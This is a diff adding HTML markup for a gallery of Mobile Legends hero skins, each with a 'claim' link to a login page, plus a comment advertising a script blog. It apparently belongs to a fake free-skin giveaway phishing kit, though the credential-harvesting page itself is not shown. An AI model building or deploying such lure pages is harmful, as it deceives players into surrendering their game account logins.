+					<p>Dark Draconic</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731483_7190532.png" alt="" />
+				<div class="movieinfo">
+					<h3>ODETTE</h3>
+					<p>Mermaid Princess</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731484_7175002.png" alt="" />
+				<div class="movieinfo">
+					<h3>IRITHEL</h3>
+					<p>Nightarrow</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731558_6001572.png" alt="" />
+				<div class="movieinfo">
+					<h3>KARRIE</h3>
+					<p>Bladed Mantis</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731559_2435147.png" alt="" />
+				<div class="movieinfo">
+					<h3>LOLITA</h3>
+					<p>Impish Trickster</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731560_8717762.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALICE</h3>
+					<p>Spirit Woman</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731561_1436280.png" alt="" />
+				<div class="movieinfo">
+					<h3>LESLEY</h3>
+					<p>Black Rose Admiral</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731562_5497857.png" alt="" />
+				<div class="movieinfo">
+					<h3>ROGER</h3>
+					<p>Anubis</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731563_8870755.png" alt="" />
+				<div class="movieinfo">
+					<h3>CYCLOPS</h3>
+					<p>Super Adventure</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731564_1584440.png" alt="" />
+				<div class="movieinfo">
+					<h3>AKAI</h3>
+					<p>Monk</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731565_6272848.png" alt="" />
+				<div class="movieinfo">
+					<h3>FRANCO</h3>
+					<p>Masterchef</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731566_8936737.png" alt="" />
+				<div class="movieinfo">
+					<h3>MINITOUR</h3>
+					<p>Taurus</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731567_8147426.png" alt="" />
+				<div class="movieinfo">
+					<h3>MOSKOV</h3>
+					<p>Snake Eye Commender</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731568_3523843.png" alt="" />
+				<div class="movieinfo">
+					<h3>YING SUN SIN</h3>
+					<p>Apocalypse Agent</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731569_3662376.png" alt="" />
+				<div class="movieinfo">
+					<h3>YING SUN SIN</h3>
+					<p>Roguish Ranger</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731570_2824303.png" alt="" />
+				<div class="movieinfo">
+					<h3>CHOU</h3>
+					<p>King Of The Fighter</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731571_2032947.png" alt="" />
+				<div class="movieinfo">
+					<h3>KAGURA</h3>
+					<p>Cherry Witch</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731572_1998847.png" alt="" />
+				<div class="movieinfo">
+					<h3>HAYABUSA</h3>
+					<p>Future Enforcer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731573_6619805.png" alt="" />
+				<div class="movieinfo">
+					<h3>RAFAELA</h3>
+					<p>Flower Fairy</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731574_12.png" alt="" />
+				<div class="movieinfo">
+					<h3>ESTES</h3>
+					<p>Galaxy Dominator</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731575_824491.png" alt="" />
+				<div class="movieinfo">
+					<h3>RAFAELA</h3>
+					<p>Biomedic</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+			    
+	   
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731576_5685269.png" alt="" />
+				<div class="movieinfo">
+					<h3>VEXANA</h3>
+					<p>Sanguine Rose</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731577_5643058.png" alt="" />
+				<div class="movieinfo">
+					<h3>FRANCO</h3>
+					<p>Apocalypse</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731578_3934951.png" alt="" />
+				<div class="movieinfo">
+					<h3>SABER</h3>
+					<p>Fullmetal Ronin</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+			    
+	   
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38644797_11.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALPHA</h3>
+					<p>Onimusha Commander</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38644827_10.png" alt="" />
+				<div class="movieinfo">
+					<h3>CHOU</h3>
+					<p>Dragon Boy</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38644834_5638945.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALICE</h3>
+					<p>Wizardry Teacher</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+		<ul id="movieposters">
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735974_9580481.png" alt="" />
+				<div class="movieinfo">
+					<h3>GATOT KACA</h3>
+					<p>Arhat King</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38799473_9125329.png" alt="" />
+				<div class="movieinfo">
+					<h3>KARINA</h3>
+					<p>Christmas Carnival</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735976_1849664.png" alt="" />
+				<div class="movieinfo">
+					<h3>Pharsa</h3>
+					<p>Peafowl Pharsa</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+		<ul id="movieposters">
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735977_4231300.png" alt="" />
+				<div class="movieinfo">
+					<h3>ARGUS</h3>
+					<p>Catastrophe</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735978_9398243.png" alt="" />
+				<div class="movieinfo">
+					<h3>LAYLA</h3>
+					<p>Bunny Babe</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735984_8341259.png" alt="" />
+				<div class="movieinfo">
+					<h3>ROGER</h3>
+					<p>DR. Beast</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>
+		<ul id="movieposters">
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735985_3966445.png" alt="" />
+				<div class="movieinfo">
+					<h3>FANNY</h3>
+					<p>Campus Youth</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735986_605298.png" alt="" />
+				<div class="movieinfo">
+					<h3>BANE</h3>
+					<p>Count Dracula</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735983_8731690.png" alt="" />
+				<div class="movieinfo">
+					<h3>KARINA</h3>
+					<p>Spider Lily</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>
+	<ul id="movieposters">
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735987_2011317.png" alt="" />
+				<div class="movieinfo">
+					<h3>GORD</h3>
+					<p>Christmas Carnival</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735988_7928199.png" alt="" />
+				<div class="movieinfo">
+					<h3>MIYA</h3>
+					<p>Honor</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735979_4655834.png" alt="" />
+				<div class="movieinfo">
+					<h3>MARTIS</h3>
+					<p>Tyrant</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+		</ul>
 </body>
 </html>
